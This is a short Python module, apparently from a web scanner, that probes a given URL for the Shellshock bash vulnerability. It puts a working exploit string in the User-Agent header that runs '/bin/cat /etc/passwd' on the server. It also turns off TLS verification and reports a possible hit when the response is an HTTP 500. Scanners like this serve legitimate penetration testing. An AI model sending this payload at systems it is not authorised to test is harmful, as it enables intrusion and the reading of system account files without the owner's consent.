from colorama import Fore
import requests

user_agent = "() { :; }; /bin/cat /etc/passwd"
header = {"User-Agent": user_agent}


def shellshock_scan(domain: str) -> str:
    res = requests.get(domain, verify=False, headers=header)
    if res.status_code == 500:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Shellshock: {Fore.GREEN}Might be vulnerable!")
    else:
        pass